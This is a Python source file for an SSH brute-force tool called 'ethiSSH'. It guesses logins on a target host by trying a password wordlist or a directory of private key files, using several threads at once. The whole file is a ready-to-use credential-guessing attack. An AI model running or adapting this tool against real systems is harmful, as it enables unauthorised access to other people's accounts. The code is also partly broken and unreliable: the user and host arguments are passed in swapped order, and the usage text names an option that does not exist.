import optparse
import pexpect
from pexpect import pxssh
import pyfiglet
import os
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Stop = False
Fails = 0

def brute_force_password(user,host, password, release):
        global Found
        global Fails
        try:
            s = pxssh.pxssh()
            s.login(host, user, password)
            print("[+] Password Found: " + password)
            Found = True
        except Exception as e:
            if 'read_nonblocking' in str(e):
                Fails += 1
                time.sleep(5)
                brute_force_password(host, user, password, False)
            elif 'synchronize with original prompt' in str(e):
                time.sleep(1)
                brute_force_password(host, user, password, False)
        finally:
            if release:
                connection_lock.release()
       # ... (Brute force through passwords functionality)

def brute_force_keys(user, host, keyfile,release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection is closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = f'ssh {user}@{host} -i {keyfile} {opt}'
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '\$', '#'])
        if ret == 2:
            print(' Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            brute_force_keys(user, host, keyfile, False)
        elif ret == 3:
            print('Connection Closed By Remote Host')
            Fails += 1
        elif ret > 3:
            print('Success. ' + str(keyfile))
            Stop = True
    finally:
        if release:
            connection_lock.release()
   


            
def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list> -d <keyfiles dir>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='passDir', type='string', help='specify the directory with password or 1024-bit keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user
    
    if host == None or passDir == None or user == None:
        print(parser.usage)
        exit(0)

    n = "ethiSSH"
    ascii = pyfiglet.figlet_format(n,font='doom')
    print(ascii)

   
   
    print("1. Brute force through passwords")
    print("2. Brute force through keys")
    choice = input("Enter your choice: ")
    if choice == "1":
        
        if options.passDir:
            fn = open(passDir, 'r')  
        for line in fn.readlines():
            if Found:
                print(" Exiting: Password Found")
                exit(0)
            if Fails > 5:
                print(" Exiting: Too Many Socket Timeouts")
                exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print("[-] Testing: " + str(password))
            t = Thread(target=brute_force_password, args=(host, user, password, True))
            t.start()
            
            
    elif choice == "2":
        if host == None or passDir == None or user == None:
            print(parser.usage)
            exit(0)
        
        for filename in os.listdir(passDir):
            if Stop:
                print('Exiting: Key Found.')
                exit(0)
            elif Fails > 5:
                print('Exiting: Too Many Connections Closed By Remote Host.')
                print('Adjust number of simultaneous threads.')
                exit(0)
            connection_lock.acquire()
            fullpath = os.path.join(passDir, filename)
            print('[-] Testing keyfile ' + str(fullpath))
            t = Thread(target=brute_force_keys, args=(user, host, fullpath, True))
            t.start()





    else:
        print("invalid option")
    
    

if __name__ == '__main__':
    main()



